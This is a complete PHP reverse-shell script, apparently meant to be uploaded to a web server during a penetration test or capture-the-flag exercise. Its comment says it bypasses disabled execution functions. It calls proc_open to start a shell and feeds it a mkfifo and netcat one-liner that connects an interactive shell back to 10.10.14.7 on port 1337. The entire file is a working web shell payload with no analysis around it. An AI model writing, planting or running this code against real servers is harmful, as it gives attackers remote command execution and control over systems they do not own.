<?php
//Upload reverse-shell, bypass exec(), shell_exec(), system(), fsockopen(), passthru()

$descriptorspec = array(
 0 => array("pipe","r"),  
 1 => array("pipe","w"),
 2 => array("file","/tmp/error-output.txt","a")
);

$cwd='/tmp';
$env=array('some_option'=>'aeiou');

$process=proc_open('sh',$descriptorspec,$pipes,$cwd,$env);

if(is_resource($process)){

    fwrite($pipes[0],'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.7 1337 >/tmp/f');
    fclose($pipes[0]);

    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);

    $return_value = proc_close($process);

    echo "command returned $return_value\n";
}
?>
